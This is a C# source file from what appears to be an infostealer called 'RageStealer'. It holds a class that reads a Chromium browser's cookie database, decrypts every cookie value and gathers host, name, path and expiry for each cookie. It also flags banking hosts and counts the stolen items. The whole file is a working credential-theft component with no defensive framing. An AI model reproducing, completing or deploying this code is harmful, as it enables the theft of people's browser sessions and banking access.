using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Browsers.Chromium;

internal sealed class Cookies
{
	public static List<Cookie> Get(string sCookie)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sCookie, "cookies");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				try
				{
					Cookie cookie = default(Cookie);
					cookie.Value = Crypto.CookiesDecrypt(sCookie, sqLite.GetValue(i, 5));
					Cookie item = cookie;
					item.HostKey = Crypto.GetUtf8(sqLite.GetValue(i, 1));
					item.Name = Crypto.GetUtf8(sqLite.GetValue(i, 3));
					item.Path = Crypto.GetUtf8(sqLite.GetValue(i, 6));
					item.ExpiresUtc = Crypto.GetUtf8(sqLite.GetValue(i, 7));
					item.IsSecure = Crypto.GetUtf8(sqLite.GetValue(i, 8).ToUpper());
					list.Add(item);
					Banking.ScanData(item.HostKey);
					Counter.Cookies++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
